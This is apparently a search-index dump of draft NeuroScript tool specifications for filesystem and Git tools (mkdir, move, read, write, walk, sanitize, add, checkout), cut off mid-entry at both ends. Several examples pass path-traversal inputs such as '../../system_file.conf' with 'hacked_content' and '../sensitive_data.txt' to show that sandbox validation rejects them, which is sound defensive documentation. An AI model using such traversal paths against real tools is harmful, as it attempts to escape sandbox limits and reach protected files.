nested_status\nENDBLOCK\n\n# Example 3: Attempt to create directory outside sandbox (will fail)\nCALL FS.Mkdir(\"../../new_system_dir\")\nSET bad_mkdir_status = LAST\n# Status will likely indicate a path security error\nEMIT \"Status of attempting restricted mkdir: \" + bad_mkdir_status\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: <code>pkg/core/tools_fs_dirs.go</code></li> <li>Function: <code>toolMkdir</code></li> <li>Key Go Packages: <code>os</code>, <code>fmt</code>, <code>path/filepath</code>, <code>strings</code></li> <li>Helpers: <code>core.SecureFilePath</code></li> <li>Registration: Called by <code>registerFsDirTools</code> within <code>pkg/core/tools_fs.go</code>. Returns <code>string, error</code>.</li> </ul> </li> </ul>"},{"location":"ns/tools/fs_movefile/","title":"fs_movefile","text":"<p>:: type: NSproject :: subtype: tool_spec :: version: 0.1.0 :: id: tool-spec-fs-movefile-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_fs_move.go, docs/script_spec.md :: relatedTo: FS.WriteFile, FS.Mkdir, FS.DeletePath :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/fs_movefile/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/fs_movefile/#tool-specification-fsmovefile-v01","title":"Tool Specification: <code>FS.MoveFile</code> (v0.1)","text":"<ul> <li>Tool Name: <code>FS.MoveFile</code> (v0.1)</li> <li>Purpose: Moves or renames a file or directory from a source path to a destination path within the sandbox. This operation fails if the destination path already exists.</li> <li>NeuroScript Syntax: <code>CALL FS.MoveFile(source: &lt;String&gt;, destination: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>source</code> (String): Required. The relative path (within the sandbox) of the existing file or directory to be moved/renamed.</li> <li><code>destination</code> (String): Required. The desired new relative path (within the sandbox) for the file or directory. This path must not already exist.</li> </ul> </li> <li>Return Value: (Map)<ul> <li>Returns a Map containing a single key: <code>error</code>. (Accessible via <code>LAST</code> after the <code>CALL</code>).<ul> <li>On success: The value associated with the <code>error</code> key is <code>nil</code>. Example: <code>{\"error\": nil}</code>.</li> <li>On failure: The value associated with the <code>error</code> key is a String describing the reason for failure (e.g., path validation error, source not found, destination already exists, OS rename error). Example: <code>{\"error\": \"Destination path 'new/data.txt' already exists.\"}</code>.</li> </ul> </li> </ul> </li> <li>Behavior:<ol> <li>Validates that exactly two arguments (<code>source</code>, <code>destination</code>), both non-empty Strings, are provided.</li> <li>Retrieves the interpreter's <code>sandboxDir</code>.</li> <li>Uses <code>SecureFilePath</code> to validate both the <code>source</code> and <code>destination</code> paths against the <code>sandboxDir</code>. If either validation fails, returns a Map <code>{\"error\": \"Validation error message\"}</code>.</li> <li>Checks if the validated <code>source</code> path exists using <code>os.Stat</code>. If it does not exist or another error occurs, returns a Map <code>{\"error\": \"Source path error message\"}</code>.</li> <li>Checks if the validated <code>destination</code> path exists using <code>os.Stat</code>.<ul> <li>If it does exist, returns a Map <code>{\"error\": \"Destination path '...' already exists.\"}</code>.</li> <li>If an error other than \"file does not exist\" occurs, returns a Map <code>{\"error\": \"Error checking destination path...\"}</code>.</li> </ul> </li> <li>If the source exists and the destination does not exist, attempts to perform the move/rename operation using <code>os.Rename</code> on the validated absolute paths.</li> <li>If <code>os.Rename</code> fails (e.g., permission denied, cross-device link error), returns a Map <code>{\"error\": \"Failed to move/rename...\"}</code>.</li> <li>If <code>os.Rename</code> succeeds, returns the Map <code>{\"error\": nil}</code>.</li> </ol> </li> <li>Security Considerations:<ul> <li>Restricted by the interpreter's sandbox directory (<code>sandboxDir</code>) via <code>SecureFilePath</code> validation on both source and destination paths.</li> <li>Performs filesystem modification (move/rename).</li> <li>Explicitly prevents overwriting existing files/directories at the destination path.</li> <li>The underlying <code>os.Rename</code> behavior might vary slightly between operating systems or across different filesystem mounts (though usually atomic within the same filesystem).</li> </ul> </li> <li>Examples: <pre><code># Example 1: Rename a file\nCALL FS.WriteFile(\"old_name.txt\", \"File content\")\nSET write_ok = LAST\n\nCALL FS.MoveFile(\"old_name.txt\", \"new_name.txt\")\nSET move_result = LAST\n\nIF move_result[\"error\"] == nil THEN\n    EMIT \"File renamed successfully from old_name.txt to new_name.txt\"\nELSE\n    EMIT \"Error renaming file: \" + move_result[\"error\"]\nENDBLOCK\n\n# Example 2: Move a file into a directory (directory must exist)\nCALL FS.Mkdir(\"data_files\")\nSET mkdir_ok = LAST\n\nCALL FS.MoveFile(\"new_name.txt\", \"data_files/final_name.txt\")\nSET move_into_dir_result = LAST\nIF move_into_dir_result[\"error\"] == nil THEN\n  EMIT \"File moved into directory successfully.\"\nELSE\n  EMIT \"Error moving file into directory: \" + move_into_dir_result[\"error\"]\nENDBLOCK\n\n# Example 3: Attempt to move onto an existing file (will fail)\nCALL FS.WriteFile(\"another_file.txt\", \"Some other content\")\nSET write_another_ok = LAST\n\nEMIT \"Attempting to move onto existing file...\"\nCALL FS.MoveFile(\"data_files/final_name.txt\", \"another_file.txt\")\nSET overwrite_attempt_result = LAST\nIF overwrite_attempt_result[\"error\"] != nil THEN\n    EMIT \"Move failed as expected: \" + overwrite_attempt_result[\"error\"]\n    # Expected error: Destination path 'another_file.txt' already exists.\nELSE\n    EMIT \"Move unexpectedly succeeded when destination existed.\"\nENDBLOCK\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: <code>pkg/core/tools_fs_move.go</code></li> <li>Function: <code>toolMoveFile</code></li> <li>Spec Name: <code>MoveFile</code></li> <li>Key Go Packages: <code>fmt</code>, <code>os</code>, <code>errors</code></li> <li>Helpers: <code>core.SecureFilePath</code></li> <li>Registration: Registered by <code>registerFsMoveTools</code> within <code>pkg/core/tools_fs.go</code>. Returns <code>map[string]interface{}, error</code>.</li> </ul> </li> </ul>"},{"location":"ns/tools/fs_readfile/","title":"fs_readfile","text":"<p>:: type: NSproject :: subtype: tool_spec :: version: 0.1.0 :: id: tool-spec-fs-readfile-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_fs_read.go :: relatedTo: FS.WriteFile :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/fs_readfile/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/fs_readfile/#tool-specification-fsreadfile-v01","title":"Tool Specification: FS.ReadFile (v0.1)","text":"<ul> <li>Tool Name: FS.ReadFile (v0.1)</li> <li>Purpose: Reads the entire content of a specified file and returns it as a string. Primarily used for accessing text-based files within the allowed workspace.</li> <li>NeuroScript Syntax: FS.ReadFile(filepath: ) <li>Arguments:<ul> <li>filepath (String): Required. The relative path to the file within the designated sandbox directory. Absolute paths or paths attempting to traverse outside the sandbox (e.g., ../outside.txt) are forbidden.</li> </ul> </li> <li>Return Value: (String)<ul> <li>On success: The complete content of the file as a string.</li> <li>On error: A string describing the failure (e.g., \"ReadFile path error...\", \"ReadFile failed: File not found...\", \"ReadFile failed for...\"). The underlying Go error is logged internally if a logger is configured but not returned directly to the script.</li> </ul> </li> <li>Behavior:<ol> <li>Validates that exactly one argument (filepath) of type String is provided.</li> <li>Retrieves the interpreter's configured sandboxDir.</li> <li>Uses the SecureFilePath helper to validate the filepath argument against the sandboxDir. This checks:<ul> <li>If the path is relative.</li> <li>If the resolved absolute path is still within the sandboxDir.</li> </ul> </li> <li>If SecureFilePath returns an error (invalid path, outside sandbox), the tool returns an error message string.</li> <li>If the path is secure, the tool attempts to read the entire file content using the validated absolute path (os.ReadFile).</li> <li>If os.ReadFile encounters an error (e.g., file does not exist, permission denied), the tool returns an appropriate error message string.</li> <li>If the file is read successfully, the tool returns its content as a single string.</li> </ol> </li> <li>Security Considerations:<ul> <li>This tool is restricted by the interpreter's sandbox directory (sandboxDir). It cannot read files outside this directory.</li> <li>Relies entirely on the SecureFilePath function for path validation. Any vulnerability in SecureFilePath could potentially allow unauthorized file access.</li> <li>File read permissions are determined by the operating system user running the NeuroScript interpreter.</li> </ul> </li> <li>Examples:     neuroscript  # Read a configuration file  config_content = FS.ReadFile(\"config/settings.json\")  if String.Contains(config_content, \"ReadFile failed\") {  IO.Log(\"Error reading config:\", config_content)  } else {  IO.Log(\"Config loaded.\")  # ... process config_content ...  }   # Attempt to read a file outside the sandbox (will fail)  bad_content = FS.ReadFile(\"../sensitive_data.txt\")  IO.Log(\"Result of bad read:\", bad_content) # Will likely log a path error message </li> <li>Go Implementation Notes:<ul> <li>Location: pkg/core/tools_fs_read.go</li> <li>Function: toolReadFile</li> <li>Key Go Packages: os, fmt</li> <li>Helpers: core.SecureFilePath</li> <li>Registration: Called by registerFsFileTools within pkg/core/tools_fs.go (which itself is called by registerCoreTools in pkg/core/tools_register.go).</li> </ul> </li>"},{"location":"ns/tools/fs_sanitizefilename/","title":"fs_sanitizefilename","text":"<p>:: type: NSproject :: subtype: tool_spec :: version: 0.1.0 :: id: tool-spec-fs-sanitizefilename-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_fs_utils.go, docs/script_spec.md :: relatedTo: FS.WriteFile, FS.Mkdir :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/fs_sanitizefilename/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/fs_sanitizefilename/#tool-specification-fssanitizefilename-v01","title":"Tool Specification: <code>FS.SanitizeFilename</code> (v0.1)","text":"<ul> <li>Tool Name: <code>FS.SanitizeFilename</code> (v0.1)</li> <li>Purpose: Takes an input string and cleans it by removing or replacing characters that are typically disallowed or problematic in filenames, making it safer to use as part of a file path.</li> <li>NeuroScript Syntax: <code>CALL FS.SanitizeFilename(name: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>name</code> (String): Required. The input string that needs to be sanitized for use in a filename.</li> </ul> </li> <li>Return Value: (String)<ul> <li>The sanitized string, suitable for use as a filename or path component. (Accessible via <code>LAST</code> after the <code>CALL</code>). The exact transformations (e.g., which characters are removed or replaced) depend on the underlying Go implementation (<code>core.SanitizeFilename</code>).</li> </ul> </li> <li>Behavior:<ol> <li>Validates that exactly one argument (<code>name</code>) of type String is provided.</li> <li>Calls the internal Go helper function <code>core.SanitizeFilename</code>, passing the input <code>name</code> string.</li> <li>Returns the sanitized string produced by the <code>core.SanitizeFilename</code> function.</li> </ol> </li> <li>Security Considerations:<ul> <li>This tool helps prevent the creation of invalid or potentially malicious filenames (e.g., containing path traversal sequences like <code>../</code>).</li> <li>It is a utility for string manipulation and does not perform sandbox path validation. Tools that perform file operations (like <code>FS.WriteFile</code>, <code>FS.Mkdir</code>) must still use <code>SecureFilePath</code> for proper sandboxing.</li> <li>The effectiveness of the sanitization depends entirely on the rules implemented in the <code>core.SanitizeFilename</code> Go function.</li> </ul> </li> <li>Examples: <pre><code># Example 1: Sanitize a string with spaces and slashes\nSET potentially_bad_name = \"My Report / Version 2\"\nCALL FS.SanitizeFilename(potentially_bad_name)\nSET safe_name = LAST\nEMIT \"Original: '\" + potentially_bad_name + \"' -&gt; Sanitized: '\" + safe_name + \"'\"\n# Example Output might be: 'My_Report_-_Version_2' or similar depending on implementation\n\n# Example 2: Use sanitized name to create a file\nSET user_input_title = \"Data analysis for Q3*?\"\nCALL FS.SanitizeFilename(user_input_title)\nSET filename_base = LAST\nSET full_filename = \"reports/\" + filename_base + \".txt\"\nEMIT \"Attempting to write to: \" + full_filename\nCALL FS.WriteFile(full_filename, \"Report content here.\")\nSET write_status = LAST\nEMIT \"Write status: \" + write_status\n\n# Example 3: Sanitize a simple name (likely no changes)\nSET simple_name = \"document1\"\nCALL FS.SanitizeFilename(simple_name)\nSET sanitized_simple = LAST\nEMIT \"Sanitized simple name: \" + sanitized_simple # Expect 'document1'\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: <code>pkg/core/tools_fs_utils.go</code></li> <li>Function: <code>toolSanitizeFilename</code></li> <li>Spec Name: <code>SanitizeFilename</code></li> <li>Key Go Packages: Relies on the internal <code>core.SanitizeFilename</code> helper.</li> <li>Helpers: <code>core.SanitizeFilename</code> (this function contains the actual sanitization logic).</li> <li>Registration: Registered by <code>registerFsUtilTools</code> within <code>pkg/core/tools_fs.go</code>. Returns <code>string, nil</code>.</li> </ul> </li> </ul>"},{"location":"ns/tools/fs_walkdir/","title":"fs_walkdir","text":"<p>:: type: NSproject :: subtype: tool_spec :: version: 0.1.0 :: id: tool-spec-fs-walkdir-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_fs_walk.go, pkg/core/tools_fs_utils.go, docs/script_spec.md :: relatedTo: FS.ListDirectory :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/fs_walkdir/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/fs_walkdir/#tool-specification-fswalkdir-v01","title":"Tool Specification: <code>FS.WalkDir</code> (v0.1)","text":"<ul> <li>Tool Name: <code>FS.WalkDir</code> (v0.1) (Note: Registered internally via spec named <code>TOOL.WalkDir</code>)</li> <li>Purpose: Recursively walks a directory tree starting from a specified path within the sandbox. It returns a flat list containing information about every file and subdirectory encountered during the traversal (excluding the starting directory itself).</li> <li>NeuroScript Syntax: <code>CALL FS.WalkDir(path: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>path</code> (String): Required. The relative path within the sandbox of the directory where the recursive walk should begin.</li> </ul> </li> <li>Return Value: (List | nil)<ul> <li>On success: A List where each element is a Map representing a file or subdirectory found within the specified <code>path</code>. Each Map contains the following keys:<ul> <li><code>name</code> (String): The base name of the file or directory.</li> <li><code>path</code> (String): The relative path of the entry from the directory specified in the <code>path</code> argument. Uses forward slashes (<code>/</code>) as separators.</li> <li><code>isDir</code> (Boolean): <code>true</code> if the entry is a directory, <code>false</code> otherwise.</li> <li><code>size</code> (Number): The size of the file in bytes. Typically 0 for directories.</li> <li><code>modTime</code> (String): The last modification time in RFC3339 format (e.g., <code>\"2025-04-22T20:36:00Z\"</code>).</li> </ul> </li> <li>On error (e.g., path validation fails, start path is not a directory, permission error during walk): Returns <code>nil</code>. Error details are logged internally. (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> <li>Special Case: If the provided start <code>path</code> does not exist, the tool returns <code>nil</code> without logging an internal error (consistent with no files found).</li> </ul> </li> <li>Behavior:<ol> <li>Validates that exactly one argument (<code>path</code>) of type String is provided and is not empty.</li> <li>Retrieves the interpreter's <code>sandboxDir</code>.</li> <li>Uses <code>SecureFilePath</code> to validate the input <code>path</code> against the <code>sandboxDir</code>. Returns <code>nil</code> if validation fails.</li> <li>Checks if the validated path exists using <code>os.Stat</code>. If it doesn't exist, returns <code>nil</code>. If other stat errors occur, returns <code>nil</code>.</li> <li>Checks if the validated path is a directory. Returns <code>nil</code> if it's not.</li> <li>Initializes an empty list to store results.</li> <li>Uses <code>filepath.WalkDir</code> to recursively traverse the directory tree starting from the validated path.</li> <li>For each item encountered during the walk (file or directory):<ul> <li>Skips the entry if it's the starting directory itself.</li> <li>Retrieves file metadata (<code>name</code>, <code>isDir</code>, <code>size</code>, <code>modTime</code>).</li> <li>Calculates the item's path relative to the starting directory.</li> <li>Creates a Map containing the retrieved metadata (<code>name</code>, <code>path</code>, <code>isDir</code>, <code>size</code>, <code>modTime</code>).</li> <li>Appends this Map to the results list.</li> <li>If an error occurs while accessing an item or its metadata during the walk (e.g., permission denied), the walk is likely terminated, and the tool proceeds to step 9.</li> </ul> </li> <li>If <code>filepath.WalkDir</code> completes without returning an error, returns the populated list of Maps.</li> <li>If <code>filepath.WalkDir</code> returns an error (due to errors in the walking process itself or errors returned by the callback function, like permission errors), the tool logs the error and returns <code>nil</code>.</li> </ol> </li> <li>Security Considerations:<ul> <li>The walk is confined to the directory tree starting within the validated sandbox path due to the initial <code>SecureFilePath</code> check.</li> <li>Reads only file/directory metadata, not content.</li> <li><code>filepath.WalkDir</code> does not follow symbolic links, preventing escapes via symlinks outside the initial validated path.</li> <li>Permission errors encountered during the walk can prevent parts of the directory tree from being listed and may cause the tool to return <code>nil</code> prematurely.</li> </ul> </li> <li>Examples: <pre><code># Prerequisite: Create some nested files/dirs\nCALL FS.Mkdir(\"walktest/subdir\")\nCALL FS.WriteFile(\"walktest/file1.txt\", \"Content A\")\nCALL FS.WriteFile(\"walktest/subdir/file2.js\", \"Content B\")\n\n# Example 1: Walk the directory\nEMIT \"Walking directory 'walktest'...\"\nCALL FS.WalkDir(\"walktest\")\nSET walk_results = LAST\n\nIF walk_results == nil THEN\n  EMIT \"Error walking 'walktest' or directory is empty/doesn't exist.\"\nELSE\n  EMIT \"Walk Results:\"\n  FOR EACH entry IN walk_results DO\n    EMIT \" - Path: \" + entry[\"path\"] + \", IsDir: \" + entry[\"isDir\"] + \", Size: \" + entry[\"size\"]\n    # Expected output (order may vary):\n    # - Path: file1.txt, IsDir: false, Size: 9\n    # - Path: subdir, IsDir: true, Size: 0\n    # - Path: subdir/file2.js, IsDir: false, Size: 9\n  ENDBLOCK\nENDBLOCK\n\n# Example 2: Walk a non-existent directory\nEMIT \"Walking non-existent directory 'no_such_dir'...\"\nCALL FS.WalkDir(\"no_such_dir\")\nSET non_existent_results = LAST\nIF non_existent_results == nil THEN\n  EMIT \"WalkDir returned nil for non-existent path (expected).\"\nELSE\n  EMIT \"WalkDir unexpectedly returned results for non-existent path.\"\nENDBLOCK\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: <code>pkg/core/tools_fs_walk.go</code></li> <li>Function: <code>toolWalkDir</code></li> <li>Spec Name: <code>TOOL.WalkDir</code> (in <code>tools_fs_utils.go</code>)</li> <li>Key Go Packages: <code>os</code>, <code>fmt</code>, <code>path/filepath</code>, <code>io/fs</code>, <code>time</code>, <code>errors</code></li> <li>Helpers: <code>core.SecureFilePath</code></li> <li>Registration: Registered via <code>registerFsUtilTools</code> slice in <code>pkg/core/tools_fs_utils.go</code>. Returns <code>[]map[string]interface{}, error</code>. Handles errors to return <code>nil</code> list.</li> </ul> </li> </ul>"},{"location":"ns/tools/fs_writefile/","title":"fs_writefile","text":"<p>:: type: NSproject :: subtype: tool_spec :: version: 0.1.1 # Incremented version due to example correction :: id: tool-spec-fs-writefile-v0.1.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_fs_write.go, docs/script_spec.md :: relatedTo: FS.ReadFile :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/fs_writefile/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/fs_writefile/#tool-specification-fswritefile-v011","title":"Tool Specification: <code>FS.WriteFile</code> (v0.1.1)","text":"<ul> <li>Tool Name: <code>FS.WriteFile</code> (v0.1.1)</li> <li>Purpose: Writes provided string content to a specified file within the designated sandbox directory. Creates parent directories if they don't exist and overwrites the file if it already exists.</li> <li>NeuroScript Syntax: <code>CALL FS.WriteFile(filepath: &lt;String&gt;, content: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>filepath</code> (String): Required. The relative path to the file within the designated sandbox directory. Absolute paths or paths attempting to traverse outside the sandbox are forbidden.</li> <li><code>content</code> (String): Required. The string content to be written to the file.</li> </ul> </li> <li>Return Value: (String)<ul> <li>On success: The literal string \"OK\". (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> <li>On error: A string describing the failure (e.g., \"WriteFile path error...\", \"WriteFile mkdir failed...\", \"WriteFile failed for...\"). (Accessible via <code>LAST</code> after the <code>CALL</code>). The underlying Go error is logged internally if a logger is configured.</li> </ul> </li> <li>Behavior:<ol> <li>Validates that exactly two arguments (<code>filepath</code>, <code>content</code>), both of type String, are provided.</li> <li>Retrieves the interpreter's configured <code>sandboxDir</code>.</li> <li>Uses the <code>SecureFilePath</code> helper to validate the <code>filepath</code> argument against the <code>sandboxDir</code>. Checks if the path is relative and stays within the sandbox.</li> <li>If <code>SecureFilePath</code> returns an error (invalid path, outside sandbox), the tool returns an error message string.</li> <li>If the path is secure, the tool determines the parent directory of the validated absolute path.</li> <li>It attempts to create all necessary parent directories using <code>os.MkdirAll</code> with default permissions (0755).</li> <li>If creating directories fails, the tool returns an error message string.</li> <li>If directories exist or are created successfully, the tool attempts to write the <code>content</code> string to the validated absolute file path using <code>os.WriteFile</code>, overwriting any existing file content. Files are written with permissions 0644.</li> <li>If writing the file fails, the tool returns an error message string.</li> <li>If the file is written successfully, the tool returns the string \"OK\".</li> </ol> </li> <li>Security Considerations:<ul> <li>This tool is restricted by the interpreter's sandbox directory (<code>sandboxDir</code>). It cannot write files outside this directory.</li> <li>Relies on <code>SecureFilePath</code> for path validation. Flaws in validation could permit writing to unintended locations within the sandbox.</li> <li>Has the ability to overwrite existing files within the sandbox. Use with caution, especially in automated scripts.</li> <li>Creates directories within the sandbox as needed.</li> <li>File write permissions are ultimately governed by the OS user running the interpreter, though the tool attempts to set mode 0644.</li> </ul> </li> <li>Examples: (Updated to conform to <code>script_spec.md</code> v1.1.0)     <pre><code># Example 1: Write a simple status message to a file\nSET log_message = \"Script finished successfully.\"\nCALL FS.WriteFile(\"logs/script_run.log\", log_message)\nSET write_status = LAST\nIF write_status != \"OK\" THEN\n    EMIT \"Error writing log file: \" + write_status\nELSE\n    EMIT \"Log file write successful.\"\nENDBLOCK\n\n# Example 2: Create a config file in a subdirectory\nSET config_data = \"{ \\\"setting\\\": \\\"value\\\", \\\"enabled\\\": true }\" # JSON-like string content\nCALL FS.WriteFile(\"config/app_settings.json\", config_data)\nSET config_status = LAST\nIF config_status == \"OK\" THEN\n    EMIT \"Config file created.\"\nELSE\n    EMIT \"Failed to create config: \" + config_status\nENDBLOCK\n\n# Example 3: Attempt to write outside the sandbox (will fail)\nCALL FS.WriteFile(\"../../system_file.conf\", \"hacked_content\")\nSET bad_write_status = LAST\n# The status will contain an error message from SecureFilePath\nEMIT \"Result of attempting restricted write: \" + bad_write_status\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: <code>pkg/core/tools_fs_write.go</code></li> <li>Function: <code>toolWriteFile</code></li> <li>Key Go Packages: <code>os</code>, <code>fmt</code>, <code>path/filepath</code></li> <li>Helpers: <code>core.SecureFilePath</code></li> <li>Registration: Called by <code>registerFsFileTools</code> within <code>pkg/core/tools_fs.go</code> (which itself is called by <code>registerCoreTools</code> in <code>pkg/core/tools_register.go</code>).</li> </ul> </li> </ul>"},{"location":"ns/tools/git_add/","title":"git_add","text":"<p>:: type: NSproject :: subtype: tool_spec :: version: 0.1.0 :: id: tool-spec-git-gitadd-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_git_register.go, pkg/core/tools_git.go, docs/script_spec.md :: relatedTo: Git.GitCommit, Git.GitStatus :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/git_add/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/git_add/#tool-specification-gitgitadd-v01","title":"Tool Specification: <code>Git.GitAdd</code> (v0.1)","text":"<ul> <li>Tool Name: <code>Git.GitAdd</code> (v0.1)</li> <li>Purpose: Stages changes in one or more specified files or directories for the next Git commit. This is equivalent to running <code>git add &lt;path1&gt; &lt;path2&gt; ...</code> within the project's sandbox directory.</li> <li>NeuroScript Syntax: <code>CALL Git.GitAdd(paths: &lt;List[String]&gt;)</code></li> <li>Arguments:<ul> <li><code>paths</code> (List of Strings): Required. A list containing one or more relative paths (strings) within the sandbox. These paths specify the files or directories whose changes should be staged.</li> </ul> </li> <li>Return Value: (String)<ul> <li>On success: A string indicating success, potentially including the output from the <code>git add</code> command. Example: <code>\"GitAdd successful for paths: [file1.txt dir/file2.go].\\nOutput:\\n\"</code> (Output may be empty if successful). (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> <li>On error: A string describing the failure. This could be due to path validation errors (e.g., \"GitAdd path error for '...': ...\") or errors from the underlying <code>git add</code> command execution (e.g., \"GitAdd failed: ...\"). (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> </ul> </li> <li>Behavior:<ol> <li>Validates that exactly one argument (<code>paths</code>) is provided and that it is a List containing only Strings.</li> <li>Retrieves the interpreter's <code>sandboxDir</code>.</li> <li>Iterates through each path string in the input <code>paths</code> list.</li> <li>For each path, uses <code>SecureFilePath</code> to validate it against the <code>sandboxDir</code>. If any path fails validation, returns an error message string immediately.</li> <li>If all paths are validated, constructs a command equivalent to <code>git add &lt;path1&gt; &lt;path2&gt; ...</code> using the validated relative paths.</li> <li>Executes the <code>git add</code> command within the <code>sandboxDir</code> using the <code>toolExec</code> helper function.</li> <li>If the command execution fails (e.g., <code>git</code> not found, <code>git add</code> returns an error), returns an error message string containing details from <code>toolExec</code>.</li> <li>If the command execution succeeds, returns a success message string, including any standard output from the <code>git add</code> command.</li> </ol> </li> <li>Security Considerations:<ul> <li>Uses <code>SecureFilePath</code> to ensure all specified paths are within the configured sandbox before passing them to the <code>git</code> command.</li> <li>Relies on the <code>toolExec</code> helper for command execution, which should execute commands within the <code>sandboxDir</code>.</li> <li>Modifies the Git index (staging area) of the repository located within the <code>sandboxDir</code>.</li> <li>Assumes the <code>git</code> executable is available in the environment's PATH where the NeuroScript interpreter is running.</li> </ul> </li> <li>Examples: <pre><code># Example 1: Stage a single modified file\nCALL FS.WriteFile(\"README.md\", \"Updated content.\") # Modify a file\nSET write_ok = LAST\n\nCALL Git.GitAdd([\"README.md\"])\nSET add_status = LAST\nEMIT \"Git Add status: \" + add_status\n\n# Example 2: Stage multiple files/directories\nCALL FS.WriteFile(\"src/main.go\", \"// New Go code\")\nCALL FS.WriteFile(\"docs/guide.md\", \"New documentation section.\")\nSET write_multi_ok = LAST\n\nSET files_to_add = [\"src/main.go\", \"docs/\"] # Add a file and a directory\nCALL Git.GitAdd(files_to_add)\nSET add_multi_status = LAST\nEMIT \"Git Add multiple status: \" + add_multi_status\n\n# Example 3: Attempt to add a file outside the sandbox (will fail validation)\nCALL Git.GitAdd([\"../sensitive_info.txt\"])\nSET add_bad_path_status = LAST\nEMIT \"Git Add bad path status: \" + add_bad_path_status\n# Expect error like: \"GitAdd path error for '../sensitive_info.txt': Path is outside sandbox\"\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: <code>pkg/core/tools_git.go</code></li> <li>Function: <code>toolGitAdd</code></li> <li>Spec Name: <code>GitAdd</code> (in <code>pkg/core/tools_git_register.go</code>)</li> <li>Key Go Packages: <code>fmt</code>, <code>strings</code>, <code>errors</code></li> <li>Helpers: <code>core.SecureFilePath</code>, <code>core.toolExec</code></li> <li>Registration: Registered by <code>registerGitTools</code> within <code>pkg/core/tools_register.go</code>. Returns <code>string, error</code>.</li> </ul> </li> </ul>"},{"location":"ns/tools/git_checkout/","title":"git_checkout","text":"<p>:: type: NSproject :: subtype: tool_spec :: version: 0.1.0 :: id: tool-spec-git-gitcheckout-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_git_register.go, pkg/core/tools_git.go, docs/script_spec.md :: relatedTo: Git.GitNewBranch, Git.GitStatus :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/git_checkout/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/git_checkout/#tool-specification-gitgitcheckout-v01","title":"Tool Specification: <code>Git.GitCheckout</code> (v0.1)","text":"<ul> <li>Tool Name: <code>Git.GitCheckout</code> (v0.1)</li> <li>Purpose: Switches the current working branch or restores working tree files. Typically used to switch to an existing branch, but can also check out specific commits or tags. This is equivalent to running <code>git checkout &lt;branch_name&gt;</code> within the project's sandbox directory.</li> <li>NeuroScript Syntax: <code>CALL Git.GitCheckout(branch_name: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>branch_name</code> (String): Required. The name of the existing branch, tag, or commit hash to check out. It cannot be an empty string.</li> </ul> </li> <li>Return Value: (String)<ul> <li>On success: A string indicating the checkout was successful, potentially including output from the <code>git checkout</code> command. Example: <code>\"Successfully checked out branch/ref 'main'.\\nOutput:\\nSwitched to branch 'main'\\nYour branch is up to date with 'origin/main'.\\n\"</code>. (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> <li>On error: A string describing the failure. This could be due to an empty <code>branch_name</code>, or errors from the underlying <code>git checkout</code> command execution (e.g., \"failed to checkout branch/ref '...': error: pathspec '...' did not match any file(s) known to git\", or errors about uncommitted changes). (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> </ul> </li> <li>Behavior:<ol> <li>Validates that exactly one argument (<code>branch_name</code>) of type String is provided.</li> <li>Validates that the <code>branch_name</code> is not empty. If it is, returns an error message string.</li> <li>Retrieves the interpreter's <code>sandboxDir</code>.</li> <li>Constructs a command equivalent to <code>git checkout \"&lt;branch_name&gt;\"</code>.</li> <li>Executes the <code>git checkout</code> command within the <code>sandboxDir</code> using the <code>toolExec</code> helper function.</li> <li>If the command execution fails (e.g., <code>git</code> not found, branch/ref does not exist, uncommitted changes prevent checkout), returns an error message string containing details from <code>toolExec</code>.</li> <li>If the command execution succeeds, returns a success message string, including the target branch/ref name and any standard output from the <code>git checkout</code> command.</li> </ol> </li> <li>Security Considerations:<ul> <li>Executes the <code>git checkout</code> command within the configured sandbox directory.</li> <li>Modifies the Git repository state by updating the HEAD reference.</li> <li>Can potentially modify files in the working directory to match the state of the checked-out branch/commit. Uncommitted changes in the working directory may be lost or cause the command to fail, depending on the state and the specific <code>git checkout</code> behavior.</li> <li>Relies on the <code>toolExec</code> helper for command execution.</li> <li>Assumes the <code>git</code> executable is available in the environment's PATH where the NeuroScript interpreter is running.</li> </ul> </li> <li>Examples: <pre><code># Example 1: Checkout an existing branch (e.g., 'main')\nCALL Git.GitCheckout(\"main\")\nSET checkout_main_status = LAST\nEMIT \"Checkout 'main' status: \" + 